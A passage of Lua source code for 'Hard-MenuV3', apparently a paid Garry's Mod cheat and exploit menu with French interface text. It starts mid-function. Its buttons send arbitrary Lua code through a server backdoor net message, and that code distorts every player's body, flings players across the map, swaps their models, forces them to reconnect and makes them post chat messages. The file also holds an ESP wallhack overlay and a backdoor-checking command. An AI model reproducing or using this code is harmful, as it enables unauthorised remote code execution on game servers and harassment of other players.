    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 360 )
Macro:SetText( "Lancer tout le monde sur toutes la map" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Lancer tout le monde sur toutes la map activÃ©" )
    SploitNotify("Pffiou ! Tout le monde s'est envolÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 495, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Changer models" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/player/Group01/male_04.mdl\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Players models changed" )
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 30 )
Macro:SetText( "STOP 2D player" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "2D player dÃ©sactivÃ© !" )
	    SploitNotify("2D player dÃ©sactivÃ© !")
    surface.PlaySound("buttons/blip1.wav") 
		net.Start(HardMenuFree)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(1,1,1))
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 	

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 60 )
Macro:SetText( "Force retry all" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde se dÃ©co/reco ! " )
    SploitNotify("DÃ©co/reco de tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 240 )
Macro:SetText( "tout le monde dit j'aime Thomas" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'j'aime thomas <3)'" )
    SploitNotify("Tout le monde dit 'j'aime thomas baguettes <3")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say I love you Thomas Baguettes")
end







]])
net.WriteBit (1)
net.SendToServer()
end
------------------------------
--     OPEN Hard MENU      --
------------------------------
surface.PlaySound("buttons/blip1.wav")
SploitNotify("OPEN Hard-MenuV3 BY " .. ply:GetName())

------------------------------
--          ESP             --
------------------------------
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
        Vector( min.x, min.y, min.z ),
        Vector( min.x, min.y, max.z ),
        Vector( min.x, max.y, min.z ),
        Vector( min.x, max.y, max.z ),
        Vector( max.x, min.y, min.z ),
        Vector( max.x, min.y, max.z ),
        Vector( max.x, max.y, min.z ),
        Vector( max.x, max.y, max.z )
}
 
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
        local onScreen = ent:LocalToWorld( corner ):ToScreen()
        minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
        maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
 
return minX, minY, maxX, maxY
end

hook.Add("HUDPaint", "ESP", function()

for k,v in pairs(player.GetAll()) do
        local x1,y1,x2,y2 = coordinates(v)
         surface.SetDrawColor(color_white)
 
 
        surface.DrawLine( x1, y1, math.min( x1 + 5, x2 ), y1 )
        surface.DrawLine( x1, y1, x1, math.min( y1 + 5, y2 ) )
 
 
        surface.DrawLine( x2, y1, math.max( x2 - 5, x1 ), y1 )
        surface.DrawLine( x2, y1, x2, math.min( y1 + 5, y2 ) )
 
 
        surface.DrawLine( x1, y2, math.min( x1 + 5, x2 ), y2 )
        surface.DrawLine( x1, y2, x1, math.max( y2 - 5, y1 ) )
 
 
        surface.DrawLine( x2, y2, math.max( x2 - 5, x1 ), y2 )
        surface.DrawLine( x2, y2, x2, math.max( y2 - 5, y1 ) )
            if v ~= LocalPlayer() and v:Alive() then
            local esppos = v:EyePos():ToScreen()
            if(v:GetUserGroup() ~= "user" or v:GetUserGroup() ~= "guest") then
                draw.SimpleText( "[".. v:GetUserGroup() .. "]" .. v:Nick(), "ESP", esppos.x, esppos.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                draw.SimpleText( "Health: " .. v:Health(), "ESP", esppos.x, esppos.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
            end
        end
    end 
end)




---------------------------------
end
concommand.Add("Hard_MenuVF", Hard)
concommand.Add("Hard_Backdoor", checkbackdoors)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/5.10, h/2.40)
            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Erreur")
            surface.SetFont("PopupFont") 
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "Tu n'as achetÃ© le Hard Menu V3," )
            surface.SetTextPos(w/5.10, h/2.40)              
            surface.DrawText( "donc tu ne peux pas l'utiliser." )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("Merci de contacter Thomas Baguettes si l'erreur persiste.")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(255,255,255) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(80,180,240) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Continue" ) 
    end 
    button.DoClick = function(s,w,h) 
        Popup:Close()
    end
	
end) 
RunConsoleCommand("fucked")
end